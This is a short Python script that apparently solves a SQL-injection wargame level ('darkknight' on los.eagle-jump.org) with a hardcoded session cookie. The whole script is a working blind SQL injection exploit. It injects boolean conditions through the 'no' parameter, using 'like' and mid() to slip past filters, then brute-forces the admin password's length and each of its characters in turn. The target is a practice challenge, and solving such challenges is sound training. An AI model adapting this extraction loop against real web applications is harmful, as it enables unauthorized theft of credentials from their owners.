import requests, urllib

url = "https://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php"

cookie = {"PHPSESSID":"oj8l6aabt4juigeiduqcn1jl73"}

### get password length ###

plen = 1
while True:
    param = {"pw": "a", "no" : "0 || ord(id) like 97 && length(pw) like " + str(plen) + "-- -"}
    response = requests.get(url, params=param, cookies=cookie)
    if "<h2>Hello admin</h2>" in response.text:
        break
    else:
        print("[*] trying get password length.. now " + str(plen))
        plen += 1

print("[*] Password length is " + str(plen))

password = ""

for i in range(plen):
    for j in range(256):
        j = (j + 32) % 256
        param = {"pw": "a", "no" : "0 || ord(id) like 97 && ord(mid(pw, " + str(i+1) + ", 1)) like " + str(j) +"-- -"}
        response = requests.get(url, params=param, cookies=cookie)
        if "<h2>Hello admin</h2>" in response.text:
            password += chr(j)
            break
        else:
            print("[*] searching " + str(i+1) + " password character.. now " + str(j))
            plen += 1
    print("[*] found password " + str(i+1) +" character! now : " + password)

print("[*] password is " + password)
